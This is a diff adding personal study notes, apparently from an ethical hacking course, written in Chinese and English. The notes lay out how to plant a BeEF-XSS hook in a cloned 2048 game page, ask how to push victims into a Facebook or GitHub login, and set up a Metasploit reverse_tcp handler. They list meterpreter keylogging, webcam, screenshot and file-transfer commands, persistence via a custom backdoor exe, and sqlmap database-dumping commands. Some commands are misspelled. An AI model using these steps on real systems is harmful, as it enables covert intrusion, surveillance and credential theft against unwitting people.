@@ -1099,3 +1099,143 @@ Semi-automatic OSINT framework and package manager
 https://github.com/kpcyrd/sn0int
 Open-source python project to handle the storage and linking of open-source intelligence (ala Maltego)
 https://github.com/mgeide/poortego
+
+## fake game
+https://github.com/PacktPublishing/The-Complete-Ethical-Hacking-Course
+
+github.com 2048
+https://github.com/atilsamancioglu/2048
+apt install apache2
+cd /var/www/html
+git clone https://github.com/atilsamancioglu/2048
+
+beef
+./install
+/opt/beef/extensions/metasploit/config.yaml
+./beef
+
+把beef-xss代码加把 2048的index.hmtl中去
+
+facebook steal
+Q：beef能否有自动脚本，比如一个人上当后，让他马上用github facebook登录
+
+有点像花生壳，有免费的域名
+https://www.noip.com
+
+## meterpreter
+
+获得一个 meterpreter 会话后我们能做什么？
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 10.0.2.15
+exploit
+session -l
+session -1
+进入会话后：
+systeminfo
+help
+webcam_stream
+
+### migratie
+ps
+能看到比如 explore.exe 进程是 2824
+那么执行
+migratie 2824
+### 上传下载文件
+upload 文件名
+download 文件名
+
+### keylogs
+keyscan_start
+keyscan_dump
+screenshot
+
+### 执久化
+
+background
+use exploit/windows/local/persisstence
+show options
+set EXE_NAME winexplore.exe
+show advanced
+set EXE:Custom /var/www/html/backdoors/kirk_newpayload.exe
+exploit 就会注射到前面的会话中去
+
+## website
+
+### vm images: metasploitable
+https://securingninja.com/how-to-install-metasploitable-in-virtualbox/
+https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
+
+https://github.com/rapid7/metasploitable3
+好像用于es迁移的
+https://github.com/rapid7/elasticsearch-drain
+A modern vulnerable web app
+https://github.com/rapid7/hackazon
+System Information Gatherer And Reporter
+https://github.com/rapid7/sigar
+Unified repository for different Metasploit Framework payloads
+https://github.com/rapid7/metasploit-payloads
+https://github.com/rapid7/mettle
+This is an implementation of a native-code Meterpreter, designed for portability, embeddability, and low resource utilization.
+https://github.com/rapid7/appspider-pentestkit
+rubytool:Pattern recognition for hosts, services, and content
+https://github.com/rapid7/recog
+Packaging metasploit-framework with omnibus
+https://github.com/rapid7/metasploit-omnibus
+
+
+### maltego
+apt install maltegoce
+website
+all transforms
+
+google: wordpress exploit
+### netcraft
+google: website infomation gathering
+
+https://archive.org/
+
+netcraft 不再提供服务
+toolbar.netcraft.com
+https://sitereport.netcraft.com/
+
+好像有一个GDPR服务
+https://www.netcraft.com/topics/gdpr/
+https://search.bilibili.com/all?keyword=GDPR
+https://www.udemy.com/courses/search/?src=ukw&q=GDPR
+https://www.youtube.com/results?search_query=GDPR
+《中华人民共和国个人信息保护法（草案）》解读|德勤
+https://www2.deloitte.com/cn/zh/pages/risk/articles/china-draft-personal-data-protection-law.html
+https://search.bilibili.com/all?keyword=%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E4%BF%9D%E6%8A%A4%E6%B3%95
+https://www.bilibili.com/video/BV13D4y1X74B?from=search&seid=6747857310039500278
+
+### reverse DNS
+https://www.yougetsignal.com/tools/web-sites-on-web-server/
+bing.com: ip:xx.xx.xx.xx
+
+### whois lookup
+https://whois.icann.org
+
+### robot.txt
+metasploitable2
+dirb http://10.0.2.5/mutillidae/
+
+
+owasp-esapi-php/
+
+### https://github.com/TheRook/subbrute
+brute
+
+### sqlmap
+sqlmap -u http://xxxx/?username=xxx
+要用带参数的请求给他，工具会帮你找到可以注入的参数
+sqlmap -u http://xxxx/?username=xxx --dbs 
+sqlmap -u http://xxxx/?username=xxx --current-db 
+sqlmap -u http://xxxx/?username=xxx --tables -D dbname 
+sqlmap -u http://xxxx/?username=xxx --columns -T tName -D dbName 
+sqlmap -u http://xxxx/?username=xxx -T tName -D dbName 
+
+### owasp zap
+scan policy
